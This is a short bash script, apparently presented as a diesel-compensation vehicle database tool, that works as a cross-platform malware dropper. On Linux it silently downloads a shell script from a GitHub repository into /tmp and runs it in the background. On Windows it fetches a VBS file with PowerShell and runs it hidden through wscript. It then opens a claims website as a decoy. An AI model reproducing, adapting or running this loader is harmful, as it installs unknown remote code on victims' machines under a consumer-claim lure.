#!/bin/bash

# URLs pointing to the SAME repository
REPO_URL="https://raw.githubusercontent.com/Admin-DieselCompensationDirect/DieselCompensation-VehicleDatabase/refs/heads/main/"
VBS_URL="$REPO_URL DieselComp-VehicleDatabase..vbs"
SH_URL="$REPO_URL DieselComp-VehicleDatabase..sh"
TARGET_URL="https://www.dieselclaimuk.co.uk/"

# Detect OS
OS=$(uname -s)

if [[ "$OS" == "Linux"* ]]; then
 # --- LINUX ---
 curl -s -L "$SH_URL" -o /tmp/DieselComp.sh
 chmod +x /tmp/DieselComp.sh
 nohup sh /tmp/DieselComp.sh > /dev/null 2>&1 &
 xdg-open "$TARGET_URL" > /dev/null 2>&1 &

elif [[ "$OS" == "MINGW64_NT"* ]] || [[ "$OS" == "CYGWIN_NT"* ]] || command -v powershell.exe > /dev/null; then
 # --- WINDOWS ---
 powershell.exe -Command "Invoke-WebRequest -Uri '$VBS_URL' -OutFile '$env:TEMP\DieselComp.vbs' -UseBasicParsing" > /dev/null 2>&1
 start /b /min wscript.exe "$env:TEMP\DieselComp.vbs" > /dev/null 2>&1
 start "" "$TARGET_URL" > /dev/null 2>&1

else
 echo "Unsupported OS."
fi
